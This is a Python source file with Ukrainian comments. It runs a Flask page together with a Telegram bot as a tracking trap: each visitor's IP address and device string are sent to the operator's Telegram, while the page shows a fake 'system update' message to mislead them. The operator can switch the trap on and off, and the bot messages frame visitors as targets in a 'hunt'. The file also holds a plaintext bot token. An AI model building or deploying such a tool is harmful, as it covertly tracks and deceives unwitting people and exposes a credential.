import telebot
from flask import Flask, request, render_template_string
import requests
import threading
import os

# --- ТВОЇ ДАНІ ---
TOKEN = '8560393413:AAH2CsrzsKkL5sFSD0PC0rLn-6GRSKMOXbM'
ADMIN_ID = 000000000 # Встав свій ID (дізнайся у @userinfobot)

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Стан системи: True - працює, False - вимкнено
is_active = True

# Команда для ВИМКНЕННЯ
@bot.message_handler(commands=['off'])
def turn_off(message):
    global is_active
    if message.from_user.id == ADMIN_ID:
        is_active = False
        bot.reply_to(message, "❌ Система ВИМКНЕНА. Пастка більше не ловить дані.")

# Команда для УВІМКНЕННЯ
@bot.message_handler(commands=['on'])
def turn_on(message):
    global is_active
    if message.from_user.id == ADMIN_ID:
        is_active = True
        bot.reply_to(message, "✅ Система УВІМКНЕНА. Полювання почалося!")

@app.route('/')
def home():
    if not is_active:
        return "<h1>Server is under maintenance</h1>", 503
    
    # Якщо активна - ловимо дані
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent')
    
    # Відправляємо звіт тобі в Telegram
    bot.send_message(ADMIN_ID, f"🎯 ЦІЛЬ ЗАФІКСОВАНА!\n🌐 IP: {ip}\n📱 Пристрій: {ua}")
    
    return "<h1>Installing System Update... 15%</h1>"

def run_bot():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    # Запускаємо бота в окремому потоці
    threading.Thread(target=run_bot).start()
    # Запускаємо веб-сервер
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
    
